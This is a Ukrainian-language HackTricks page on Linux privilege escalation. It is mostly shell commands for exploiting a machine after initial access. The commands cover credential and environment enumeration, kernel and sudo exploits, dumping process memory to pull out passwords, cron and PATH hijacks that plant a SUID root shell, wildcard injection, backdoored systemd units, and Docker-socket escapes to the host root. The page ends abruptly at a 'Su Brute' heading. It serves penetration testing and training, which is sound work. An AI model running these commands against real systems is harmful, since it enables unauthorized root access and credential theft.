# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Давайте почнемо отримувати деякі знання про ОС, що працює
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо у вас **є права на запис у будь-якій папці всередині змінної `PATH`**, ви можете мати можливість перехопити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Env info

Цікава інформація, паролі або API ключі в змінних середовища?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію ядра та чи існує якийсь експлойт, який можна використати для ескалації привілеїв
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих ядер та деякі вже **скомпільовані експлойти** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де ви можете знайти деякі **скомпільовані експлойти**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії ядер з цього веб-сайту, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти в пошуку експлойтів ядра:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (виконати У жертви, перевіряє експлойти лише для ядра 2.x)

Завжди **шукайте версію ядра в Google**, можливо, ваша версія ядра згадується в якому-небудь експлойті ядра, і тоді ви будете впевнені, що цей експлойт дійсний.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Версія Sudo

Виходячи з вразливих версій sudo, які з'являються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи вразлива версія sudo, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg підпис перевірки не вдався

Перевірте **smasher2 box of HTB** для **прикладу** того, як цю уразливість можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Більше системної енумерації
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перерахувати можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви всередині контейнера docker, ви можете спробувати втекти з нього:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Перевірте **що змонтовано і не змонтовано**, де і чому. Якщо щось не змонтовано, ви можете спробувати змонтувати це і перевірити на наявність приватної інформації.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перерахуйте корисні двійкові файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи **встановлений будь-який компілятор**. Це корисно, якщо вам потрібно використовувати якийсь експлойт ядра, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Вразливе програмне забезпечення встановлено

Перевірте **версію встановлених пакетів та сервісів**. Можливо, є якась стара версія Nagios (наприклад), яка може бути використана для ескалації привілеїв…\
Рекомендується вручну перевірити версію більш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ до машини через SSH, ви також можете використовувати **openVAS** для перевірки застарілого та вразливого програмного забезпечення, встановленого на машині.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка в основному буде марною, тому рекомендується використовувати деякі програми, такі як OpenVAS або подібні, які перевірять, чи є будь-яка версія встановленого програмного забезпечення вразливою до відомих експлойтів._

## Процеси

Подивіться на **які процеси** виконуються та перевірте, чи має який-небудь процес **більше привілеїв, ніж повинен** (можливо, tomcat виконується від імені root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте наявність [**electron/cef/chromium debuggers**], які працюють, ви можете зловживати цим для підвищення привілеїв](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляють їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї над бінарними файлами процесів**, можливо, ви зможете перезаписати когось.

### Моніторинг процесів

Ви можете використовувати інструменти, такі як [**pspy**](https://github.com/DominicBreuker/pspy), для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, які виконуються часто або коли виконуються певні умови.

### Пам'ять процесу

Деякі служби сервера зберігають **облікові дані у відкритому тексті в пам'яті**.\
Зазвичай вам потрібні **root-привілеї**, щоб читати пам'ять процесів, які належать іншим користувачам, тому це зазвичай більш корисно, коли ви вже є root і хочете виявити більше облікових даних.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, якими володієте**.

> [!WARNING]
> Зверніть увагу, що в наш час більшість машин **не дозволяють ptrace за замовчуванням**, що означає, що ви не можете скинути інші процеси, які належать вашому непривабливому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: всі процеси можуть бути налагоджені, якщо у них однаковий uid. Це класичний спосіб, як працював ptracing.
> - **kernel.yama.ptrace_scope = 1**: тільки батьківський процес може бути налагоджений.
> - **kernel.yama.ptrace_scope = 2**: тільки адміністратор може використовувати ptrace, оскільки це вимагає можливості CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: жоден процес не може бути відстежений за допомогою ptrace. Після встановлення потрібно перезавантаження, щоб знову активувати ptracing.

#### GDB

Якщо у вас є доступ до пам'яті служби FTP (наприклад), ви можете отримати Heap і шукати в його облікових даних.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу, **maps показує, як пам'ять відображається в віртуальному адресному просторі цього процесу**; також показує **дозволи кожного відображеного регіону**. Псевдофайл **mem** **викриває пам'ять процесів**. З файлу **maps** ми знаємо, які **регіони пам'яті є читабельними** та їх зсуви. Ми використовуємо цю інформацію, щоб **перейти до файлу mem і скинути всі читабельні регіони** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. Віртуальний адресний простір ядра можна отримати за допомогою /dev/kmem.\
Зазвичай, `/dev/mem` доступний лише для читання **root** та групи **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump - це переосмислення класичного інструменту ProcDump з набору інструментів Sysinternals для Windows. Отримайте його за посиланням [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб вивантажити пам'ять процесу, ви можете використовувати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну видалити вимоги до root і вивантажити процес, що належить вам
- Скрипт A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес аутентифікації працює:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете скинути процес (див. попередні розділи, щоб знайти різні способи скидання пам'яті процесу) і шукати облікові дані всередині пам'яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **викраде відкриті облікові дані з пам'яті** та з деяких **відомих файлів**. Для правильної роботи потрібні права root.

| Функція                                           | Назва процесу       |
| ------------------------------------------------- | -------------------- |
| Пароль GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Активні FTP з'єднання)                   | vsftpd               |
| Apache2 (Активні сесії HTTP Basic Auth)          | apache2              |
| OpenSSH (Активні SSH сесії - використання Sudo)  | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Крон завдання

Перевірте, чи є які-небудь заплановані завдання вразливими. Можливо, ви зможете скористатися скриптом, що виконується від імені root (вразливість з підстановкою? можна змінювати файли, які використовує root? використовувати символічні посилання? створювати специфічні файли в каталозі, який використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Наприклад, всередині _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо всередині цього crontab користувач root намагається виконати якусь команду або скрипт без встановлення шляху. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використовуючи:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron використовуючи скрипт з підстановочним знаком (Wildcard Injection)

Якщо скрипт, що виконується від імені root, містить “**\***” всередині команди, ви можете використати це для виконання несподіваних дій (наприклад, підвищення привілеїв). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо символ підстановки передує шляху, як** _**/some/path/\***_ **, він не є вразливим (навіть** _**./\***_ **не є).**

Прочитайте наступну сторінку для отримання додаткових трюків експлуатації символів підстановки:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Перезапис скрипта cron і символічне посилання

Якщо ви **можете змінити скрипт cron**, що виконується від імені root, ви можете дуже легко отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, виконуваний root, використовує **каталог, до якого у вас є повний доступ**, можливо, буде корисно видалити цей каталог і **створити символічне посилання на інший**, що виконує скрипт, контрольований вами.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Часті cron завдання

Ви можете моніторити процеси, щоб шукати процеси, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і підвищити привілеї.

Наприклад, щоб **моніторити кожні 0.1с протягом 1 хвилини**, **сортувати за менш виконуваними командами** і видалити команди, які виконувалися найбільше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (це буде моніторити та перераховувати кожен процес, що запускається).

### Невидимі cron завдання

Можливо створити cronjob **додавши символ повернення каретки після коментаря** (без символу нового рядка), і cron завдання буде працювати. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Послуги

### Записувані _.service_ файли

Перевірте, чи можете ви записати будь-який `.service` файл, якщо так, ви **можете змінити його**, щоб він **виконував** ваш **бекдор, коли** служба **запускається**, **перезапускається** або **зупиняється** (можливо, вам потрібно буде почекати, поки машина перезавантажиться).\
Наприклад, створіть ваш бекдор всередині .service файлу з **`ExecStart=/tmp/script.sh`**

### Записувані бінарні файли служби

Майте на увазі, що якщо у вас є **права на запис для бінарних файлів, які виконуються службами**, ви можете змінити їх на бекдори, щоб, коли служби будуть повторно виконані, бекдори також виконувалися.

### systemd PATH - Відносні шляхи

Ви можете побачити PATH, який використовується **systemd** за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** в будь-якій з папок шляху, ви можете мати можливість **підвищити привілеї**. Вам потрібно шукати **відносні шляхи, що використовуються в конфігураційних файлах сервісів**, таких як:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Тоді створіть **виконуваний файл** з **тим самим ім'ям, що й відносний шлях до бінарного файлу** в папці системи systemd, в яку ви можете записувати, і коли служба буде запитана для виконання вразливої дії (**Почати**, **Зупинити**, **Перезавантажити**), ваш **бекдор буде виконано** (зазвичай користувачі без привілеїв не можуть починати/зупиняти служби, але перевірте, чи можете ви використовувати `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** - це файли одиниць systemd, назва яких закінчується на `**.timer**`, які контролюють `**.service**` файли або події. **Таймери** можуть використовуватися як альтернатива cron, оскільки вони мають вбудовану підтримку календарних подій та монотонних подій часу і можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Writable timers

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі екземпляри systemd.unit (як `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації ви можете прочитати, що таке Unit:

> Юніт, який потрібно активувати, коли цей таймер спливає. Аргумент - це назва юніта, суфікс якого не ".timer". Якщо не вказано, це значення за замовчуванням є сервісом, який має таку ж назву, як юніт таймера, за винятком суфікса. (Див. вище.) Рекомендується, щоб назва юніта, який активується, і назва юніта таймера були однаковими, за винятком суфікса.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь юніт systemd (наприклад, `.service`), який **виконує записуваний бінарний файл**
- Знайти якийсь юніт systemd, який **виконує відносний шлях** і у вас є **права на запис** над **шляхом systemd** (щоб видавати себе за цей виконуваний файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, вам потрібні права root і потрібно виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зверніть увагу, що **таймер** **активується** шляхом створення символічного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) дозволяють **комунікацію процесів** на тих же або різних машинах в рамках моделей клієнт-сервер. Вони використовують стандартні файли дескрипторів Unix для міжкомп'ютерної комунікації і налаштовуються через файли `.socket`.

Сокети можна налаштувати за допомогою файлів `.socket`.

**Дізнайтеся більше про сокети за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці параметри різні, але підсумок використовується для **вказівки, де буде прослуховуватися** сокет (шлях до файлу сокета AF_UNIX, IPv4/6 і/або номер порту для прослуховування тощо)
- `Accept`: Приймає булевий аргумент. Якщо **true**, **екземпляр служби створюється для кожного вхідного з'єднання** і тільки сокет з'єднання передається йому. Якщо **false**, всі сокети прослуховування самі **передаються запущеній одиниці служби**, і тільки одна одиниця служби створюється для всіх з'єднань. Це значення ігнорується для датаграмних сокетів і FIFO, де одна одиниця служби безумовно обробляє весь вхідний трафік. **За замовчуванням false**. З міркувань продуктивності рекомендується писати нові демони лише в спосіб, який підходить для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймає одну або кілька командних рядків, які **виконуються перед** або **після** того, як прослуховуючі **сокети**/FIFO **створені** та прив'язані відповідно. Перший токен командного рядка повинен бути абсолютним іменем файлу, за ним слідують аргументи для процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються перед** або **після** того, як прослуховуючі **сокети**/FIFO **закриті** та видалені відповідно.
- `Service`: Вказує ім'я **одиниці служби**, **яку потрібно активувати** при **вхідному трафіку**. Ця настройка дозволена лише для сокетів з Accept=no. За замовчуванням вона відповідає службі, яка має таку ж назву, як сокет (з заміненим суфіксом). У більшості випадків не повинно бути необхідності використовувати цю опцію.

### Записувані .socket файли

Якщо ви знайдете **записуваний** файл `.socket`, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor`, і бекдор буде виконано перед створенням сокета. Тому вам **можливо, доведеться почекати, поки машина перезавантажиться.**\
_Зверніть увагу, що система повинна використовувати цю конфігурацію файлу сокета, інакше бекдор не буде виконано_

### Записувані сокети

Якщо ви **виявите будь-який записуваний сокет** (_тепер ми говоримо про Unix сокети, а не про конфігураційні файли `.socket`_), тоді **ви можете спілкуватися** з цим сокетом і, можливо, експлуатувати вразливість.

### Перерахунок Unix сокетів
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP сокети

Зверніть увагу, що можуть бути деякі **сокети, які слухають HTTP** запити (_Я не говорю про .socket файли, а про файли, які діють як unix сокети_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо сокет **відповідає HTTP** запитом, ви можете **спілкуватися** з ним і, можливо, **використати якусь вразливість**.

### Записуваний Docker Socket

Docker сокет, зазвичай розташований за адресою `/var/run/docker.sock`, є критично важливим файлом, який слід захистити. За замовчуванням, він доступний для запису користувачу `root` та членам групи `docker`. Наявність доступу на запис до цього сокету може призвести до підвищення привілеїв. Ось розгляд того, як це можна зробити, а також альтернативні методи, якщо Docker CLI недоступний.

#### **Підвищення привілеїв за допомогою Docker CLI**

Якщо у вас є доступ на запис до Docker сокету, ви можете підвищити привілеї, використовуючи наступні команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють вам запустити контейнер з доступом на рівні root до файлової системи хоста.

#### **Використання Docker API безпосередньо**

У випадках, коли Docker CLI недоступний, сокет Docker все ще можна маніпулювати, використовуючи Docker API та команди `curl`.

1.  **Список Docker Images:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Створити контейнер:** Відправити запит на створення контейнера, який монтує кореневий каталог системи хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть новостворений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Приєднатися до контейнера:** Використовуйте `socat`, щоб встановити з'єднання з контейнером, що дозволяє виконувати команди в ньому.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з'єднання `socat` ви можете виконувати команди безпосередньо в контейнері з доступом на рівні root до файлової системи хоста.

### Інше

Зверніть увагу, що якщо у вас є права на запис над сокетом docker, тому що ви **всередині групи `docker`**, у вас є [**більше способів підвищити привілеї**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API слухає на порту**, ви також можете його скомпрометувати](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перевірте **більше способів вийти з docker або зловживати ним для підвищення привілеїв** в:

{{#ref}}
docker-security/
{{#endref}}

## Підвищення привілеїв Containerd (ctr)

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** підвищення привілеїв

Якщо ви виявите, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна **система міжпроцесорної комунікації (IPC)**, яка дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасної системи Linux, вона пропонує надійну структуру для різних форм комунікації між додатками.

Система є універсальною, підтримуючи базову IPC, яка покращує обмін даними між процесами, нагадуючи **покращені сокети домену UNIX**. Крім того, вона допомагає у трансляції подій або сигналів, сприяючи безперебійній інтеграції між компонентами системи. Наприклад, сигнал від Bluetooth-демона про вхідний дзвінок може змусити музичний плеєр вимкнути звук, покращуючи досвід користувача. Крім того, D-Bus підтримує систему віддалених об'єктів, спрощуючи запити на послуги та виклики методів між додатками, спрощуючи процеси, які раніше були традиційно складними.

D-Bus працює за моделлю **дозволу/заборони**, керуючи дозволами на повідомлення (виклики методів, випуск сигналів тощо) на основі кумулятивного ефекту відповідних правил політики. Ці політики визначають взаємодії з шиною, потенційно дозволяючи підвищення привілеїв через експлуатацію цих дозволів.

Приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf` надається, детально описуючи дозволи для користувача root на володіння, відправку та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без зазначеного користувача або групи застосовуються універсально, тоді як "за замовчуванням" контекстні політики застосовуються до всіх, які не охоплені іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як перерахувати та експлуатувати D-Bus комунікацію тут:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво перерахувати мережу та з'ясувати позицію машини.

### Загальне перерахування
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якою ви не змогли взаємодіяти до її доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете ви перехоплювати трафік. Якщо так, ви зможете отримати деякі облікові дані.
```
timeout 1 tcpdump
```
## Користувачі

### Загальна Перерахунка

Перевірте **хто** ви, які **привілеї** у вас є, які **користувачі** є в системах, які можуть **увійти** і які мають **root-привілеї:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Деякі версії Linux були під впливом помилки, яка дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Більше інформації: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) та [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Використайте**: **`systemd-run -t /bin/bash`**

### Groups

Перевірте, чи є ви **членом якоїсь групи**, яка може надати вам root-привілеї:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Перевірте, чи є щось цікаве в буфері обміну (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти як кожен користувач**, використовуючи цей пароль.

### Su Brute

